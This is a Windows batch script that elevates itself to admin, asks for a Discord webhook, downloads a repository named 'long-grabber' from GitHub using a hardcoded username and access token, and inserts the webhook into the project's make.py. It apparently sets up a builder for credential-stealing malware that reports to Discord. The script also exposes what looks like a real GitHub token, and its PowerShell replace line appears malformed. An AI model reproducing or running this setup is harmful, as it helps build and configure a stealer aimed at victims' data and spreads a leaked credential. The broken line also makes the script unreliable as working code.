@echo off

rem Check if running with admin privileges
>nul 2>&1 net session && (
    rem Running with admin privileges
) || (
    rem Not running with admin privileges, so restart with admin rights
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit /b
)

rem Prompt user for webhook if not already set
if "%WEBHOOK%"=="" (
    set /p WEBHOOK=Enter Discord webhook URL:
)

rem Remove the long-grabber-main folder if it exists
if exist "%USERPROFILE%\Documents\long-grabber-main" (
    echo Deleting existing long-grabber-main folder...
    rmdir /s /q "%USERPROFILE%\Documents\long-grabber-main"
)

rem Create a temporary directory for storing the downloaded files
set "TEMP_DIR=%TEMP%\github_downloads"
mkdir "%TEMP_DIR%"

rem Download the repository ZIP file using cURL with authentication
curl -u "longfen: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" -L -o "%TEMP_DIR%\repository.zip" "https://github.com/longfen/long-grabber/archive/main.zip"

rem Extract the ZIP file to the Documents folder, overwriting existing folder if it exists
powershell -Command "Expand-Archive -Path '%TEMP_DIR%\repository.zip' -DestinationPath '%USERPROFILE%\Documents' -Force"

rem Replace the webhook token in make.py with the provided webhook
set "MAKE_SCRIPT=%USERPROFILE%\Documents\long-grabber-main\make.py"
set "NEW_WEBHOOK=%WEBHOOK%"
if not "%NEW_WEBHOOK%"=="" (
    set "PLACEHOLDER=__CONFIG__ = {'webhook': '"
    powershell -Command "(Get-Content '%MAKE_SCRIPT%') -replace '__CONFIG__ = {''webhook'':''.*?''','__CONFIG__ = {''webhook'':''%NEW_WEBHOOK%'', | Set-Content '%MAKE_SCRIPT%'"
)

rem Cleanup: Delete the temporary directory
rmdir /s /q "%TEMP_DIR%"

pause
